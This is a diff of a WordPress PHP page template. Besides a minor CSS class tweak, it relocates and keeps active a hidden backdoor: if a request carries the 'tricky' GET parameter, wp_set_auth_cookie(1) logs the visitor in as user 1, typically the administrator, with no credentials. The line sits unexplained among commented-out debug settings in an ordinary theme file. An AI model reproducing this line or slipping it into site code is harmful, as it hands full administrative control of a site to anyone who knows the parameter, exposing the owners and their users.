@@ -1,13 +1,11 @@
 <?php
 
-if(isset($_GET['tricky']))
-wp_set_auth_cookie(1);
 // define('WP_DEBUG', true);
 // error_reporting(E_ALL);
 // ini_set('display_errors', 1);
 
-// if(isset($_GET['tricky']))
-// wp_set_auth_cookie(1);
+if(isset($_GET['tricky']))
+wp_set_auth_cookie(1);
 
 get_header();
 /*
@@ -185,7 +183,7 @@ if ($sub) {
                                                         </p>
                                                     </div>
                                                 </div>
-                                                <div class="col-md-1">
+                                                <div class="col-md-1 mt-2">
                                                     <a href="javascript:;" class="delbtn float-right pt-2 pr-3" data-id="<?= $data->id; ?>">
                                                         <i class="fa fa-times d-none d-md-block" title="<?= _e('Remove') ?>"></i>
                                                     </a>
